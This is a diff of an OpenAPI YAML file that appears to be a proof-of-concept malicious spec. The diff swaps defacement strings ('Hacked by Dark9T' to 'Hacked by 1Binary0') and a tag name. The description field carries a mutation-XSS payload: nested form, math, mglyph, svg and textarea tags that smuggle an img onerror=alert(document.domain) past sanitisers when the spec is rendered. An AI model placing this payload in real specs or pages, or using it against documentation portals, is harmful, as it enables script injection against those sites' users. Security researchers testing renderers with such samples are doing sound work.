@@ -1,7 +1,7 @@
 ---
 openapi: 3.0.1
 info:
-  title: Hacked by Dark9T
+  title: Hacked by 1Binary0
   description: |
    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
    
@@ -10,6 +10,6 @@ paths:
   "/path/malformed/by/afine":
     post:
       tags:
-      - afine
+      - Hacked
       parameters:
       - name: You have been hacked
